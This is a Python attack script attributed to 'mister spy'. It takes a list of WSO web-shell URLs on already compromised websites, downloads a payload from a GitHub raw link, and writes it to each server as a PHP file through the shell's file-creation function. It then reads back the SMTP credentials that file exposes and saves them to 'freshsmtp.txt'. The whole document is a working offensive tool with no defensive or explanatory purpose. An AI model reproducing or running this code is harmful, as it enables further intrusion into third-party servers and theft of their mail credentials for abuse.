import sys,os,re,socket,binascii,time,json,random,threading,Queue,pprint,urlparse,smtplib,telnetlib,os.path,hashlib,string,urllib2,glob,sqlite3,urllib,argparse,marshal,base64,colorama,requests
from colorama import *
from random import choice
from colorama import Fore,Back,init
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from platform import system
from Queue import Queue
from time import strftime
from urlparse import urlparse
from urllib2 import urlopen
colorama.init()


# Now regular ANSI codes should work, even in Windows
CLEAR_SCREEN = '\033[2J'
RED = '\033[31m'   # mode 31 = red forground
RESET = '\033[0m'  # mode 0  = reset
BLUE  = "\033[34m"
CYAN  = "\033[36m"
GREEN = "\033[32m"
RESET = "\033[0m"
BOLD    = "\033[m"
REVERSE = "\033[m"
#coded by mister spy
#contact me 712083179
def logo():
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37  ]

        x = """ 
          " " " " " " " " " " " " " " " " " " " "  "
          "                  ,__,                  "
          "                  (oo)____              "
          "                  (__)    )\            "
          "                     ||--|| *  Smtp     "
          "                                        "
          " " " " " " " " " " " " " " " " " " " "  "
		          Coded By Mister Spy
			                  """
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.05)
logo()

def olux(url):
    shell = '<'+requests.get("https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/smtp.txt").text
    try:
        url = url.replace('\n', '').replace('\r', '')
        rzlt = requests.get(url,  headers = {'User-agent': 'Mozilla/5.0'} ,timeout=7).text
        namec = rzlt.split("<input type=hidden name=c value='")[1]
        namec = namec.split("'")[0]
        namech = rzlt.split("<input type=hidden name=charset value='")[1]
        namech = namech.split("'")[0]
        values = {'a':'FilesTools','c':namec,'p1':'saybnikarzet.php','p2':'mkfile','p3':shell,'charset':namech,'f':'saybnikarzet.php'}
        r =  requests.post(url, headers = {'User-agent': 'Mozilla/5.0'} , data = values  ,timeout=7)
        urlx = url.split("/")
        kk = url.replace(urlx[len(urlx)-1] , "saybnikarzet.php")
        rzlt = requests.get(kk,  headers = {'User-agent': 'Mozilla/5.0'} ,timeout=7).text
        if "roottn" in rzlt :
            result = re.search('tazx(.*)tazx', rzlt)
            print(BLUE + 'Found Smtp In Shell ==>' + kk +RESET)
            print(GREEN + '  Smtp' + result.group(1) +RESET)
            save = open('freshsmtp.txt', 'a')
            save.write((result.group(1))+'\n')
            save.close()
    except:
        print(RED + 'Failed ==>' + url +RESET)


taz = raw_input("Enter Ur List OF Wso Shells :")
with open(taz) as f:
	for url in f:
		olux(url)


